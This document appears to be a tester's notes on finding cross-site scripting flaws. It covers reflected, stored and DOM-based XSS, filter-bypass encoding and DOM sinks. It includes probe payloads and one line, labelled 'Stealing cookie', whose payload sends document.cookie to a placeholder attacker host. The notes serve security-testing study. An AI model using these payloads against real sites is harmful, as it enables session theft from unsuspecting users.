# Cross Site Scripting (XSS)

**Attack Vectors**

Initially test if the page breaks using:
1. **Break out of JS function:** ``` ' " ` ```
2. **HTML injection:** `<img src=x>`
3. **Break out of HTML tag attribute:** ``` '> "> `> ```

Then proceed with complex payloads.

Challenges:
1. <script> might be filtered
- Try using encoding %3cscript%3e
- Try double or triple encoding also.

## Testing for Reflected XSS 
  
- a.k.a First Order Xss

Requirements:
1. Attacker's code executes within a single HTTP response.
2. Often goes within request URIs or params.
3. Executes only after the user clicks the link.

Input vectors to test - all user controlled variables:
1. HTTP parameters.
2. POST parameters.
3. POST data.
4. Hidden fields.
5. Predefined radio or selection values.
  
## Testing for Stored XSS 
  
- a.k.a Second Order XSS
  
Requirements:
1. The data is stored within the application.
2. Affects any user that visits the page - does not require user interaction like reflected.
 
Input vectors to test:
1. User/Profile details
2. Shopping cart items
3. File upload
4. Forum posts
5. Blog comments
6. User logs

IMPORTANT: All data must be tested by inserting in user areas and viewing in admin areas -> for IMPACT.

IMPORTANT TIP:
- This is only for reflected or stored XSS. 
- Send a unique identifiable string within < and > such as `<nybble>`.
- Now search the page source for `nybble`.
- Check if the < and > symbols are encoded as `&lt` and `&gt`. If not, XSS is possible

## Testing for DOM XSS

This vulnerability is hard to detect. Hence, it is quite common in production environments.
- The view-src technique will not work
- To view DOM we must use the developer console
  
> XSS Rat tip: use `<img src=x onerror=alert('xss')>`

> Stealing cookie: `<img src=x onerror=this.src='http://ATTACKER_IP:ATTACKER_PORT/?'+document.cookie;>`

**Methodology**:

- Look for JS in the source that can be controlled, i.e. not imported scripts.
- Now look in the developer console how changes to the inputs (sources) affect elements in the DOM (sinks).
- Look for specific sources and sinks from the [DOM XSS Wiki](https://github.com/wisec/domxsswiki).
- Craft the payload accordingly

### Sink is document.write
- `document.write` writes to the DOM
-Try closing the element that is being written and create a new element with the payload.

### Sink is innerHTML
- `innerHTML` writes HTML to a div or class element
- Try the img src onerror payload.

### Sink is JQuery href attribute
- If href attribute is a sink try `javascript:alert('xss')`

### Sink is JQuery selector
  - In old version of jQuery, if a HTML element is passed to the jQuery selector `$(<h1>createme</h1>)`, and if that element doesn't exsits, JQuery will create that element.
- Try the img src onerror payload.
- Try the img src onerror payload within an iframe with onload event.
